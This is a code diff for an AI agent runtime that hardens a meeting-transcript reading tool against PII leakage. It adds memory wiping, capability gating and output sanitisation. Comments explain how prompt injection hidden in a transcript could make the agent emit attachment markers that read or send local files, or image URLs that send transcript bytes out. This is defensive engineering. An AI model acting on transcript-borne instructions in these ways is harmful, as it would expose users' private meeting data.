@@ -121,6 +121,67 @@ const DEFAULT_MAX_HISTORY: u32 = 50;
 /// this percentage, Agent.autoCompactHistory skips the next attempt. Protects
 /// against repeated LLM summary calls on a tightly-packed session saving little.
 const COMPACTION_MIN_SAVINGS_PERCENT: u8 = 10;
+const MINUTES_NON_READ_TOOL_BLOCKED_OUTPUT = "Tool blocked after minutes_read; only minutes_read may run for the rest of this turn";
+const MINUTES_CAPABILITY_BLOCKED_OUTPUT = "minutes_read is unavailable for this turn";
+
+fn wipeOwnedBytes(value: []const u8) void {
+    if (value.len > 0) std.crypto.secureZero(u8, @constCast(value));
+}
+
+fn freeOwnedBytesWithPolicy(allocator: std.mem.Allocator, value: []const u8, sensitive: bool) void {
+    if (sensitive) wipeOwnedBytes(value);
+    allocator.free(value);
+}
+
+fn wipeAndDeinitByteList(allocator: std.mem.Allocator, list: *std.ArrayListUnmanaged(u8)) void {
+    if (list.capacity > 0) wipeOwnedBytes(list.allocatedSlice());
+    list.deinit(allocator);
+}
+
+/// Arena child allocator that clears every allocation before returning it to
+/// the backing allocator. The agent turn arena holds provider requests,
+/// parsed tool arguments, and formatted tool results; a Minutes turn can put
+/// transcript PII in any of those scratch buffers. Refusing in-place resize
+/// keeps the wipe-before-free invariant simple and deterministic.
+const ZeroizingAllocator = struct {
+    child: std.mem.Allocator,
+
+    fn allocator(self: *@This()) std.mem.Allocator {
+        return .{ .ptr = self, .vtable = &vtable };
+    }
+
+    fn alloc(ctx: *anyopaque, len: usize, alignment: std.mem.Alignment, ret_addr: usize) ?[*]u8 {
+        const self: *@This() = @ptrCast(@alignCast(ctx));
+        return self.child.rawAlloc(len, alignment, ret_addr);
+    }
+
+    fn resize(_: *anyopaque, _: []u8, _: std.mem.Alignment, _: usize, _: usize) bool {
+        return false;
+    }
+
+    fn remap(_: *anyopaque, _: []u8, _: std.mem.Alignment, _: usize, _: usize) ?[*]u8 {
+        return null;
+    }
+
+    fn free(ctx: *anyopaque, memory: []u8, alignment: std.mem.Alignment, ret_addr: usize) void {
+        const self: *@This() = @ptrCast(@alignCast(ctx));
+        std.crypto.secureZero(u8, memory);
+        self.child.rawFree(memory, alignment, ret_addr);
+    }
+
+    const vtable = std.mem.Allocator.VTable{
+        .alloc = alloc,
+        .resize = resize,
+        .remap = remap,
+        .free = free,
+    };
+};
+
+comptime {
+    if (tools_mod.minutes_read.MAX_DISPATCH_OUTPUT_BYTES > dispatcher.MAX_TOOL_RESULT_CONTEXT_CHARS) {
+        @compileError("minutes_read output cap must fit the dispatcher tool-result context cap");
+    }
+}
 
 /// P0-3 — hard ceiling on how long `Agent.deinit` will wait for a stuck
 /// lifecycle worker to drain before tearing down regardless. The default
@@ -145,11 +206,17 @@ pub const Agent = struct {
         agent: *Agent,
         callback: providers.StreamCallback,
         callback_ctx: *anyopaque,
+        scratch_allocator: std.mem.Allocator,
         iteration: u32,
         provider_start_ms: i64,
         first_token_recorded: bool = false,
         first_token_ms: ?u64 = null,
         emission_mode: StreamEmissionMode = .undecided,
+        /// Minutes foreground mode is stronger than the ordinary heuristic
+        /// hold: no delta may reach the callback until `flushValidatedReply`
+        /// supplies the parsed final public answer. Allocation failure drops
+        /// buffered data instead of falling back to pass-through.
+        strict_hold: bool = false,
         buffered_text: std.ArrayListUnmanaged(u8) = .empty,
         final_pending: bool = false,
         /// D53 third defense layer (2026-05-24): in `.pass_through` mode the
@@ -174,8 +241,17 @@ pub const Agent = struct {
         }
 
         fn deinit(self: *StreamTimingContext) void {
-            self.buffered_text.deinit(self.agent.allocator);
-            self.pending_tail.deinit(self.agent.allocator);
+            // Strict hold buffers unvalidated provider bytes. A Minutes call
+            // can place transcript-derived PII here before the response parser
+            // discovers and latches the tool call. `clearRetainingCapacity`
+            // only resets the logical length, so wipe the complete backing
+            // allocations (including previously-cleared bytes) before free.
+            if (self.strict_hold) {
+                if (self.buffered_text.capacity > 0) wipeOwnedBytes(self.buffered_text.allocatedSlice());
+                if (self.pending_tail.capacity > 0) wipeOwnedBytes(self.pending_tail.allocatedSlice());
+            }
+            self.buffered_text.deinit(self.scratch_allocator);
+            self.pending_tail.deinit(self.scratch_allocator);
         }
 
         fn flushBuffered(self: *StreamTimingContext) void {
@@ -186,8 +262,8 @@ pub const Agent = struct {
                 // stream markup ("Got it.\n<tool_call>{...}"). Strip before
                 // emitting; otherwise the entire accumulated buffer leaks
                 // raw on transition.
-                const scrubbed = Agent.stripToolCallMarkup(self.agent.allocator, self.buffered_text.items);
-                defer if (scrubbed.ptr != self.buffered_text.items.ptr) self.agent.allocator.free(scrubbed);
+                const scrubbed = Agent.stripToolCallMarkup(self.scratch_allocator, self.buffered_text.items);
+                defer if (scrubbed.ptr != self.buffered_text.items.ptr) self.scratch_allocator.free(scrubbed);
                 if (transcript.shouldExposeHistoryMessage("assistant", scrubbed)) {
                     self.callback(self.callback_ctx, providers.StreamChunk.textDelta(scrubbed));
                 }
@@ -208,8 +284,9 @@ pub const Agent = struct {
                 // display_text (see agent/root.zig:4129) so it should be
                 // clean; the strip here is defense-in-depth for any future
                 // caller that forgets the upstream scrub.
-                const scrubbed = Agent.stripToolCallMarkup(self.agent.allocator, reply_text);
-                defer if (scrubbed.ptr != reply_text.ptr) self.agent.allocator.free(scrubbed);
+                const scrubbed = Agent.stripToolCallMarkup(self.scratch_allocator, reply_text);
+                defer if (scrubbed.ptr != reply_text.ptr)
+                    self.scratch_allocator.free(scrubbed);
                 if (transcript.shouldExposeHistoryMessage("assistant", scrubbed)) {
                     self.callback(self.callback_ctx, providers.StreamChunk.textDelta(scrubbed));
                 }
@@ -220,7 +297,7 @@ pub const Agent = struct {
         }
 
         fn recordBufferedDelta(self: *StreamTimingContext, delta: []const u8) bool {
-            self.buffered_text.appendSlice(self.agent.allocator, delta) catch return false;
+            self.buffered_text.appendSlice(self.scratch_allocator, delta) catch return false;
             return true;
         }
 
@@ -241,7 +318,7 @@ pub const Agent = struct {
         fn emitScrubbedDelta(self: *StreamTimingContext, chunk: providers.StreamChunk) void {
             // Combine any held tail with the new delta so split markup
             // reassembles correctly.
-            const allocator = self.agent.allocator;
+            const allocator = self.scratch_allocator;
             var combined: std.ArrayListUnmanaged(u8) = .empty;
             defer combined.deinit(allocator);
             combined.appendSlice(allocator, self.pending_tail.items) catch {
@@ -363,10 +440,19 @@ pub const Agent = struct {
         }
         if (chunk.delta.len == 0) return;
         if (!ctx.recordBufferedDelta(chunk.delta)) {
+            if (ctx.strict_hold) {
+                // Fail closed: flushing or forwarding here would turn an OOM
+                // into a transcript leak. The accumulated provider result still
+                // arrives out-of-band and can be parsed by the turn loop.
+                ctx.buffered_text.clearRetainingCapacity();
+                return;
+            }
             ctx.flushBuffered();
             ctx.callback(ctx.callback_ctx, chunk);
             return;
         }
+
+        if (ctx.strict_hold) return;
 
         const buffered_line = Agent.firstNonEmptyLine(ctx.buffered_text.items) orelse return;
         if (transcript.looksLikeInternalReflectionPrefix(ctx.buffered_text.items) or
@@ -759,6 +845,21 @@ pub const Agent = struct {
     /// provide a live provider may set this to false to preserve the legacy
     /// "return tool output as reply text" behavior.
     approval_continues_turn: bool = true,
+    /// Slash-command continuations such as `/approve` can run a nested Agent
+    /// turn. Preserve the nested reply's lifecycle policy so the outer command
+    /// result cannot downgrade Minutes-derived text to an ordinary reply.
+    command_reply_data_policy: ReplyDataPolicy = .ordinary,
+    /// Request-local capability gate. A text-only primary cannot safely move
+    /// a Minutes-capable turn to an unapproved vision sidecar, so an inbound
+    /// image disables Minutes for that turn and preserves ordinary vision
+    /// routing instead.
+    minutes_read_disabled_for_turn: bool = false,
+    /// The provider/prompt surface must match execution authorization. These
+    /// borrowed views are installed for the duration of `turnOutcome`; when
+    /// Minutes has no foreground budget they exclude its tool and schema.
+    current_turn_tool_surface_active: bool = false,
+    current_turn_tools: []const Tool = &.{},
+    current_turn_tool_specs: []const ToolSpec = &.{},
     session_ttl_secs: ?u64 = null,
     focus_target: ?[]const u8 = null,
     focus_target_owned: bool = false,
@@ -998,6 +1099,22 @@ pub const Agent = struct {
             if (self.tool_call_id) |id| allocator.free(id);
         }
 
+        /// Foreground Minutes messages contain transcript-derived PII. Wipe
+        /// every owned byte slice before applying the ordinary ownership/free
+        /// contract. Empty literals are never mutated or freed.
+        pub fn deinitSensitive(self: *const OwnedMessage, allocator: std.mem.Allocator) void {
+            wipeOwnedBytes(self.content);
+            if (self.reasoning) |value| wipeOwnedBytes(value);
+            for (self.tool_calls) |tc| {
+                wipeOwnedBytes(tc.id);
+                wipeOwnedBytes(tc.name);
+                wipeOwnedBytes(tc.arguments);
+            }
+            if (self.name) |value| wipeOwnedBytes(value);
+            if (self.tool_call_id) |value| wipeOwnedBytes(value);
+            self.deinit(allocator);
+        }
+
         fn toChatMessage(self: *const OwnedMessage) ChatMessage {
             return .{
                 .role = self.role,
@@ -1043,6 +1160,14 @@ pub const Agent = struct {
     /// The `tool_calls_executed` and `spawned_task_ids` slices are
     /// also owned and freed by `deinit`. Use `justText` for the most
     /// common case (text-only reply); use `deinit` exactly once.
+    pub const ReplyDataPolicy = enum {
+        ordinary,
+        /// Visible to the requesting client, but excluded from generic Agent
+        /// history/autosave/compaction/extraction. Downstream holders should
+        /// clear the owned text when its display lifetime ends.
+        minutes_display_only,
+    };
+
     pub const TurnOutcome = struct {
         /// The assistant text reply. Empty string for tool-only turns.
         /// Heap-allocated in the agent's allocator.
@@ -1072,6 +1197,8 @@ pub const Agent = struct {
         /// the gateway show a different status badge than plain
         /// iteration-exhaustion.
         loop_detected: bool = false,
+        /// Provenance/data-lifecycle classification for the visible reply.
+        reply_data_policy: ReplyDataPolicy = .ordinary,
 
         /// Convenience constructor for the most common case: text-only
         /// reply with no tools and no spawns. The slice is taken as-is
@@ -1084,6 +1211,7 @@ pub const Agent = struct {
         /// on the returned outcome. After this, every field's slice
         /// is invalid.
         pub fn deinit(self: *const TurnOutcome, allocator: std.mem.Allocator) void {
+            if (self.reply_data_policy == .minutes_display_only) wipeOwnedBytes(self.text);
             allocator.free(self.text);
             for (self.tool_calls_executed) |name| allocator.free(name);
             allocator.free(self.tool_calls_executed);
@@ -1985,8 +2113,8 @@ pub const Agent = struct {
         return "xml_fallback";
     }
 
-    fn supportsProviderNativeTranscript(self: *const Agent) bool {
-        if (!self.provider.supportsNativeTools()) return false;
+    fn supportsProviderNativeTranscript(self: *const Agent, request: providers.ChatRequest) bool {
+        if (!self.provider.supportsNativeToolsForRequest(request)) return false;
         const provider_name = self.provider.getName();
         return containsAsciiIgnoreCase(provider_name, "openai") or
             containsAsciiIgnoreCase(provider_name, "openrouter") or
@@ -2024,11 +2152,17 @@ pub const Agent = struct {
         calls: []const ParsedToolCall,
     ) ![]providers.ToolCall {
         if (calls.len == 0) return &.{};
+        const sensitive = parsedCallsContainMinutesRead(calls);
         const cloned = try self.allocator.alloc(providers.ToolCall, calls.len);
         errdefer self.allocator.free(cloned);
         var initialized: usize = 0;
         errdefer {
             for (cloned[0..initialized]) |tc| {
+                if (sensitive) {
+                    wipeOwnedBytes(tc.id);
+                    wipeOwnedBytes(tc.name);
+                    wipeOwnedBytes(tc.arguments);
+                }
                 if (tc.id.len > 0) self.allocator.free(tc.id);
                 if (tc.name.len > 0) self.allocator.free(tc.name);
                 if (tc.arguments.len > 0) self.allocator.free(tc.arguments);
@@ -2036,34 +2170,300 @@ pub const Agent = struct {
         }
         for (calls, 0..) |call, i| {
             const id = call.tool_call_id orelse "";
+            const owned_id = try self.allocator.dupe(u8, id);
+            errdefer freeOwnedBytesWithPolicy(self.allocator, owned_id, sensitive);
+            const owned_name = try self.allocator.dupe(u8, call.name);
+            errdefer freeOwnedBytesWithPolicy(self.allocator, owned_name, sensitive);
+            const owned_arguments = try self.allocator.dupe(u8, call.arguments_json);
+            errdefer freeOwnedBytesWithPolicy(self.allocator, owned_arguments, sensitive);
             cloned[i] = .{
-                .id = try self.allocator.dupe(u8, id),
-                .name = try self.allocator.dupe(u8, call.name),
-                .arguments = try self.allocator.dupe(u8, call.arguments_json),
+                .id = owned_id,
+                .name = owned_name,
+                .arguments = owned_arguments,
             };
             initialized += 1;
         }
         return cloned;
     }
 
+    fn isMinutesReadCall(tool_name: []const u8) bool {
+        return std.mem.eql(u8, tool_name, tools_mod.minutes_read.MinutesReadTool.tool_name);
+    }
+
+    fn parsedCallsContainMinutesRead(calls: []const ParsedToolCall) bool {
+        for (calls) |call| {
+            if (isMinutesReadCall(call.name)) return true;
+        }
+        return false;
+    }
+
+    fn hasMinutesReadTool(self: *const Agent) bool {
+        for (self.tools) |tool| {
+            if (isMinutesReadCall(tool.name())) return true;
+        }
+        return false;
+    }
+
+    fn minutesReadBudgetEligible(self: *const Agent) bool {
+        if (!self.hasMinutesReadTool()) return false;
+        const turn_context = tools_mod.getTurnContext();
+        if (tools_mod.isBackgroundTurnOrigin(turn_context.origin)) return false;
+        return turn_context.minutes_read_budget != null;
+    }
+
+    fn minutesReadProviderSafe(self: *const Agent) bool {
+        const probe = providers.ChatRequest{
+            .messages = &.{},
+            .model = self.model_name,
+            .provider_selection_policy = .exact_primary_and_model,
+        };
+        return self.provider.supportsSensitiveStreamingForRequest(probe);
+    }
+
+    fn minutesReadRuntimeAuthorized(self: *const Agent) bool {
+        return self.minutesReadBudgetEligible() and self.minutesReadProviderSafe();
+    }
+
+    fn canInvokeMinutesRead(self: *const Agent) bool {
+        return self.minutesReadRuntimeAuthorized() and !self.minutes_read_disabled_for_turn;
+    }
+
+    const CurrentTurnToolSurface = struct {
+        tools: []const Tool,
+        specs: []const ToolSpec,
+        owns_tools: bool = false,
+        owns_specs: bool = false,
+
+        fn deinit(self: *@This(), allocator: std.mem.Allocator) void {
+            if (self.owns_tools) allocator.free(self.tools);
+            if (self.owns_specs) allocator.free(self.specs);
+            self.* = .{ .tools = &.{}, .specs = &.{} };
+        }
+    };
+
+    fn buildCurrentTurnToolSurface(self: *const Agent) !CurrentTurnToolSurface {
+        if (self.canInvokeMinutesRead() or !self.hasMinutesReadTool()) {
+            return .{ .tools = self.tools, .specs = self.tool_specs };
+        }
+
+        var tool_count: usize = 0;
+        for (self.tools) |tool| {
+            if (!isMinutesReadCall(tool.name())) tool_count += 1;
+        }
+        const filtered_tools = try self.allocator.alloc(Tool, tool_count);
+        errdefer self.allocator.free(filtered_tools);
+        var tool_index: usize = 0;
+        for (self.tools) |tool| {
+            if (isMinutesReadCall(tool.name())) continue;
+            filtered_tools[tool_index] = tool;
+            tool_index += 1;
+        }
+
+        var spec_count: usize = 0;
+        for (self.tool_specs) |spec| {
+            if (!isMinutesReadCall(spec.name)) spec_count += 1;
+        }
+        const filtered_specs = try self.allocator.alloc(ToolSpec, spec_count);
+        errdefer self.allocator.free(filtered_specs);
+        var spec_index: usize = 0;
+        for (self.tool_specs) |spec| {
+            if (isMinutesReadCall(spec.name)) continue;
+            filtered_specs[spec_index] = spec;
+            spec_index += 1;
+        }
+
+        return .{
+            .tools = filtered_tools,
+            .specs = filtered_specs,
+            .owns_tools = true,
+            .owns_specs = true,
+        };
+    }
+
+    pub fn toolsForCurrentTurn(self: *const Agent) []const Tool {
+        return if (self.current_turn_tool_surface_active) self.current_turn_tools else self.tools;
+    }
+
+    fn toolSpecsForCurrentTurn(self: *const Agent) []const ToolSpec {
+        return if (self.current_turn_tool_surface_active) self.current_turn_tool_specs else self.tool_specs;
+    }
+
+    fn hasImageMarker(text: []const u8) bool {
+        var cursor: usize = 0;
+        while (std.mem.indexOfPos(u8, text, cursor, "[")) |open| {
+            const close = std.mem.indexOfPos(u8, text, open + 1, "]") orelse return false;
+            const marker = text[open + 1 .. close];
+            if (std.mem.indexOfScalar(u8, marker, ':')) |colon| {
+                const kind = marker[0..colon];
+                const target = std.mem.trim(u8, marker[colon + 1 ..], " \t\r\n");
+                if (target.len > 0 and
+                    (std.ascii.eqlIgnoreCase(kind, "image") or
+                        std.ascii.eqlIgnoreCase(kind, "photo") or
+                        std.ascii.eqlIgnoreCase(kind, "img")))
+                {
+                    return true;
+                }
+            }
+            cursor = close + 1;
+        }
+        return false;
+    }
+
+    fn shouldDisableMinutesForVision(self: *const Agent, user_message: []const u8) bool {
+        if (!self.minutesReadRuntimeAuthorized()) return false;
+        if (!hasImageMarker(user_message)) return false;
+        return shouldRouteToVisionFallback(self.model_name, self.vision_fallback_model, true);
+    }
+
+    fn discardSensitiveStream(_: *anyopaque, _: providers.StreamChunk) void {}
+
+    fn providerSelectionPolicyForCurrentTurn(self: *const Agent) providers.ProviderSelectionPolicy {
+        return if (self.canInvokeMinutesRead()) .exact_primary_and_model else .fallback_chain;
+    }
+
+    /// Context assembly must select the tool surface from the same
+    /// request-local provider boundary used for dispatch. Otherwise an extra
+    /// provider could make the aggregate report native tools even though the
+    /// exact primary authorized for Minutes cannot process them.
+    pub fn supportsProviderNativeToolsForCurrentTurn(self: *const Agent) bool {
+        const probe = providers.ChatRequest{
+            .messages = &.{},
+            .model = self.model_name,
+            .provider_selection_policy = self.providerSelectionPolicyForCurrentTurn(),
+        };
+        return self.provider.supportsNativeToolsForRequest(probe);
+    }
+
+    fn taskPlanFailureSummary(result: ToolExecutionResult, minutes_foreground_latched: bool) []const u8 {
+        if (isMinutesReadCall(result.name)) return "minutes_read failed";
+        if (minutes_foreground_latched) return "tool failed after minutes_read";
+        return if (result.output.len > 0) result.output else "tool failed";
+    }
+
+    const LOOP_DETECTION_WINDOW: usize = 3;
+
+    /// The generic loop detector fingerprints tool names and arguments. That
+    /// diagnostic state is useful for ordinary turns, but a Minutes burst can
+    /// contain transcript-derived meeting IDs and cursors. Return before even
+    /// initializing the hasher for the foreground lane so no weak fingerprint
+    /// of sensitive arguments is left in stack scratch.
+    fn recordLoopCallSetHash(
+        calls: []const ParsedToolCall,
+        minutes_foreground_latched: bool,
+        recent_call_hashes: *[LOOP_DETECTION_WINDOW]u64,
+        recent_call_idx: *usize,
+    ) ?u64 {
+        if (minutes_foreground_latched) return null;
+
+        var h = std.hash.Fnv1a_64.init();
+        for (calls) |call| {
+            h.update(call.name);
+            h.update("\x00");
+            h.update(call.arguments_json);
+            h.update("\x01");
+        }
+        const call_set_hash = h.final();
+        recent_call_hashes[recent_call_idx.* % LOOP_DETECTION_WINDOW] = call_set_hash;
+        recent_call_idx.* += 1;
+        return call_set_hash;
+    }
+
+    fn reflectionToolName(calls: []const ParsedToolCall, minutes_foreground_latched: bool) ?[]const u8 {
+        if (!minutes_foreground_latched) return if (calls.len > 0) calls[0].name else null;
+        for (calls) |call| {
+            if (isMinutesReadCall(call.name)) return tools_mod.minutes_read.MinutesReadTool.tool_name;
+        }
+        return null;
+    }
+
+    /// Minutes results are sensitive PII. Once a turn executes an exact
+    /// `minutes_read` call, every intermediate provider message for the rest of
+    /// that turn lives in a turn-local lane instead of `Agent.history`. The
+    /// provider still sees a valid assistant/tool transcript, but persistence,
+    /// extraction, compaction and the next turn cannot see those direct
+    /// foreground artifacts. The final visible answer uses the corresponding
+    /// display-only reply policy rather than generic assistant persistence.
+    fn intermediateHistoryTarget(
+        self: *Agent,
+        foreground: *std.ArrayListUnmanaged(OwnedMessage),
+        minutes_foreground_latched: bool,
+    ) *std.ArrayListUnmanaged(OwnedMessage) {
+        return if (minutes_foreground_latched) foreground else &self.history;
+    }
+
+    fn deinitOwnedMessageList(self: *Agent, messages: *std.ArrayListUnmanaged(OwnedMessage)) void {
+        for (messages.items) |*message| message.deinit(self.allocator);
+        messages.deinit(self.allocator);
+    }
+
+    fn deinitSensitiveOwnedMessageList(self: *Agent, messages: *std.ArrayListUnmanaged(OwnedMessage)) void {
+        for (messages.items) |*message| message.deinitSensitive(self.allocator);
+        messages.deinit(self.allocator);
+    }
+
+    /// A plan parsed from the same provider response that invokes Minutes can
+    /// echo meeting titles, participant names, or transcript fragments. Wipe
+    /// each uniquely-owned string before delegating to TaskPlan's ordinary
+    /// ownership teardown. `title` aliases `description`, and `tool_used`
+    /// aliases `actual_tool`, so neither alias is wiped a second time.
+    fn deinitTaskPlanWithPolicy(
+        self: *Agent,
+        plan: *task_planner.TaskPlan,
+        sensitive: bool,
+    ) void {
+        if (sensitive) {
+            wipeOwnedBytes(plan.plan_id);
+            wipeOwnedBytes(plan.session_key);
+            wipeOwnedBytes(plan.run_id);
+            wipeOwnedBytes(plan.summary);
+            if (plan.supersedes_plan_id) |value| wipeOwnedBytes(value);
+            for (plan.steps) |step| {
+                wipeOwnedBytes(step.id);
+                wipeOwnedBytes(step.description);
+                if (step.expected_tool) |value| wipeOwnedBytes(value);
+                if (step.actual_tool) |value| wipeOwnedBytes(value);
+                if (step.result_summary) |value| wipeOwnedBytes(value);
+                if (step.error_summary) |value| wipeOwnedBytes(value);
+            }
+        }
+        plan.deinit(self.allocator);
+    }
+
+    fn appendOwnedTextMessage(
+        self: *Agent,
+        target: *std.ArrayListUnmanaged(OwnedMessage),
+        role: providers.Role,
+        content: []const u8,
+    ) !void {
+        const sensitive = target != &self.history;
+        const owned_content = try self.allocator.dupe(u8, content);
+        errdefer freeOwnedBytesWithPolicy(self.allocator, owned_content, sensitive);
+        try target.append(self.allocator, .{
+            .role = role,
+            .content = owned_content,
+        });
+    }
+
     fn appendNativeToolResultHistory(
         self: *Agent,
         arena: std.mem.Allocator,
         results: []const ToolExecutionResult,
+        target: *std.ArrayListUnmanaged(OwnedMessage),
     ) !void {
+        const sensitive = target != &self.history;
         for (results) |result| {
             const bounded = try dispatcher.formatBoundedToolResultContent(arena, result);
             const scrubbed = try providers.scrubToolOutput(arena, bounded);
             const content = try self.allocator.dupe(u8, scrubbed);
-            errdefer self.allocator.free(content);
+            errdefer freeOwnedBytesWithPolicy(self.allocator, content, sensitive);
             const tool_name = try self.allocator.dupe(u8, result.name);
-            errdefer self.allocator.free(tool_name);
+            errdefer freeOwnedBytesWithPolicy(self.allocator, tool_name, sensitive);
             const tool_call_id = if (result.tool_call_id) |id|
                 try self.allocator.dupe(u8, id)
             else
                 try self.allocator.dupe(u8, "unknown");
-            errdefer self.allocator.free(tool_call_id);
-            try self.history.append(self.allocator, .{
+            errdefer freeOwnedBytesWithPolicy(self.allocator, tool_call_id, sensitive);
+            try target.append(self.allocator, .{
                 .role = .tool,
                 .content = content,
                 .name = tool_name,
@@ -2228,7 +2628,6 @@ pub const Agent = struct {
         }
 
         var out: std.ArrayListUnmanaged(u8) = .{};
-        errdefer out.deinit(allocator);
 
         var rest = text;
         while (rest.len > 0) {
@@ -2270,19 +2669,118 @@ pub const Agent = struct {
             }
 
             if (hit == null) {
-                out.appendSlice(allocator, rest) catch return @constCast(text);
+                out.appendSlice(allocator, rest) catch {
+                    wipeAndDeinitByteList(allocator, &out);
+                    return @constCast(text);
+                };
                 break;
             }
-            out.appendSlice(allocator, rest[0..hit.?]) catch return @constCast(text);
+            out.appendSlice(allocator, rest[0..hit.?]) catch {
+                wipeAndDeinitByteList(allocator, &out);
+                return @constCast(text);
+            };
             rest = rest[hit.? + hit_len ..];
         }
 
         // Collapse runs of >=2 blank lines down to one.
         const collapsed = collapseBlankLineRuns(allocator, out.items) catch {
-            return out.toOwnedSlice(allocator) catch return @constCast(text);
+            return out.toOwnedSlice(allocator) catch {
+                wipeAndDeinitByteList(allocator, &out);
+                return @constCast(text);
+            };
         };
-        out.deinit(allocator);
+        wipeAndDeinitByteList(allocator, &out);
         return collapsed;
+    }
+
+    /// Remove channel/gateway attachment control markers from model-authored
+    /// text in the Minutes foreground lane. Minutes may read sensitive meeting
+    /// content, but no tool permitted in that lane can mint a trusted local
+    /// attachment. Consequently every marker in the model reply is untrusted:
+    /// passing one through would let transcript prompt injection turn an
+    /// invented path such as `[AUDIO:/absolute/secret]` into a downstream file
+    /// read/send operation.
+    ///
+    /// Matching is ASCII case-insensitive because gateway detection is also
+    /// case-insensitive. A malformed marker without `]` consumes the remaining
+    /// text so a partial control sequence can never reach a channel parser.
+    fn suppressUntrustedAttachmentMarkers(allocator: std.mem.Allocator, text: []const u8) ![]u8 {
+        const prefixes = [_][]const u8{
+            "[AUDIO:",
+            "[VOICE:",
+            "[IMAGE:",
+            "[PHOTO:",
+            "[VIDEO:",
+            "[DOCUMENT:",
+            "[FILE:",
+        };
+
+        var out: std.ArrayListUnmanaged(u8) = .empty;
+        errdefer wipeAndDeinitByteList(allocator, &out);
+
+        var copy_start: usize = 0;
+        var i: usize = 0;
+        while (i < text.len) {
+            var marker_prefix_len: ?usize = null;
+            inline for (prefixes) |prefix| {
+                if (marker_prefix_len == null and
+                    text.len - i >= prefix.len and
+                    std.ascii.eqlIgnoreCase(text[i .. i + prefix.len], prefix))
+                {
+                    marker_prefix_len = prefix.len;
+                }
+            }
+
+            if (marker_prefix_len == null) {
+                i += 1;
+                continue;
+            }
+
+            try out.appendSlice(allocator, text[copy_start..i]);
+            try out.appendSlice(allocator, "[attachment omitted]");
+            const payload_start = i + marker_prefix_len.?;
+            if (std.mem.indexOfScalarPos(u8, text, payload_start, ']')) |close| {
+                i = close + 1;
+                copy_start = i;
+            } else {
+                i = text.len;
+                copy_start = text.len;
+            }
+        }
+        try out.appendSlice(allocator, text[copy_start..]);
+        return out.toOwnedSlice(allocator);
+    }
+
+    /// Minutes replies are derived from an untrusted transcript. The Hub UI
+    /// promotes Markdown image syntax and bare image URLs into active `<img>`
+    /// requests, while chat clients may create automatic link previews. An
+    /// attacker-controlled meeting must not be able to trigger those network
+    /// requests or put transcript bytes into a URL. Defang both HTTP schemes
+    /// in-place (`https` -> `hxxps`, same byte length) before any transport or
+    /// renderer sees the display-only reply.
+    fn defangUntrustedExternalReferences(allocator: std.mem.Allocator, text: []const u8) ![]u8 {
+        const output = try allocator.dupe(u8, text);
+        var i: usize = 0;
+        while (i + "http://".len <= output.len) : (i += 1) {
+            const remaining = output[i..];
+            const scheme_len: usize = if (remaining.len >= "https://".len and
+                std.ascii.eqlIgnoreCase(remaining[0.."https://".len], "https://"))
+                "https://".len
+            else if (std.ascii.eqlIgnoreCase(remaining[0.."http://".len], "http://"))
+                "http://".len
+            else
+                continue;
+            output[i + 1] = 'x';
+            output[i + 2] = 'x';
+            i += scheme_len - 1;
+        }
+        return output;
+    }
+
+    fn sanitizeMinutesDisplayText(allocator: std.mem.Allocator, text: []const u8) ![]u8 {
+        const attachment_safe = try suppressUntrustedAttachmentMarkers(allocator, text);
+        defer freeOwnedBytesWithPolicy(allocator, attachment_safe, true);
+        return defangUntrustedExternalReferences(allocator, attachment_safe);
     }
 
     /// Brain-leak Fix B (rework) — NON-MUTATING detection of a system-prompt
@@ -2484,6 +2982,7 @@ pub const Agent = struct {
         action_budget,
         execution_mode,
         background_origin,
+        capability_unavailable,
         approval_required,
         approval_denied,
         /// Blocked because the user's entitlement does not cover this tool
@@ -2569,7 +3068,7 @@ pub const Agent = struct {
     };
 
     fn preflightBlockEmitsToolResult(source: ToolPreflightSource) bool {
-        return source != .approval_required;
+        return source != .approval_required and source != .capability_unavailable;
     }
 
     const ToolPreflightDecision = union(enum) {
@@ -2761,20 +3260,18 @@ pub const Agent = struct {
         arena: std.mem.Allocator,
         results: []const ToolExecutionResult,
         native_transcript_active: bool,
+        target: *std.ArrayListUnmanaged(OwnedMessage),
     ) !void {
         if (results.len == 0) return;
 
         if (native_transcript_active) {
-            try self.appendNativeToolResultHistory(arena, results);
+            try self.appendNativeToolResultHistory(arena, results, target);
             return;
         }
 
         const formatted_results = try dispatcher.formatToolResults(arena, results);
         const scrubbed_results = try providers.scrubToolOutput(arena, formatted_results);
-        try self.history.append(self.allocator, .{
-            .role = .user,
-            .content = try self.allocator.dupe(u8, scrubbed_results),
-        });
+        try self.appendOwnedTextMessage(target, .user, scrubbed_results);
         self.last_turn_context.xml_history_messages += 1;
         self.last_turn_context.bounded_result_count += @intCast(@min(results.len, std.math.maxInt(u32)));
     }
@@ -3061,6 +3558,23 @@ pub const Agent = struct {
 
     fn preflightToolPolicy(self: *Agent, call: ParsedToolCall) PolicyPreflightResult {
         const meta = self.metadataForToolCall(call);
+
+        // The request-local Minutes surface and dispatch authority are one
+        // capability. Models can hallucinate an unadvertised tool name; never
+        // let that bypass a missing foreground budget, a background origin,
+        // or the vision-sidecar incompatibility gate.
+        if (isMinutesReadCall(call.name) and !self.canInvokeMinutesRead()) {
+            return .{ .blocked = .{
+                .name = call.name,
+                .tool_call_id = call.tool_call_id,
+                .output = MINUTES_CAPABILITY_BLOCKED_OUTPUT,
+                .source = .capability_unavailable,
+                .reason = "minutes_read_not_authorized_for_turn",
+                .mode = self.execution_mode,
+                .risk_level = meta.risk_level,
+                .metadata = meta,
+            } };
+        }
 
         if (self.policy) |pol| {
             if (!pol.canAct()) {
@@ -3393,25 +3907,60 @@ pub const Agent = struct {
         iteration: u32,
         parsed_calls: []const ParsedToolCall,
         results_buf: *std.ArrayListUnmanaged(ToolExecutionResult),
+        minutes_foreground_latched: bool,
     ) !void {
         for (parsed_calls, 0..) |call, i| {
+            if (isMinutesReadCall(call.name) and !self.canInvokeMinutesRead()) {
+                try results_buf.append(self.allocator, .{
+                    .name = call.name,
+                    .output = MINUTES_CAPABILITY_BLOCKED_OUTPUT,
+                    .success = false,
+                    .tool_call_id = call.tool_call_id,
+                });
+                continue;
+            }
+            if (minutes_foreground_latched and !isMinutesReadCall(call.name)) {
+                // Once a burst contains Minutes, every other provider-authored
+                // call is untrusted transcript-derived control data. Preserve a
+                // paired native/XML result for protocol validity, but do not
+                // look up metadata, run preflight/approval, emit observers or
+                // hooks, parse args, or execute the tool.
+                try results_buf.append(self.allocator, .{
+                    .name = call.name,
+                    .output = MINUTES_NON_READ_TOOL_BLOCKED_OUTPUT,
+                    .success = false,
+                    .tool_call_id = call.tool_call_id,
+                });
+                continue;
+            }
+
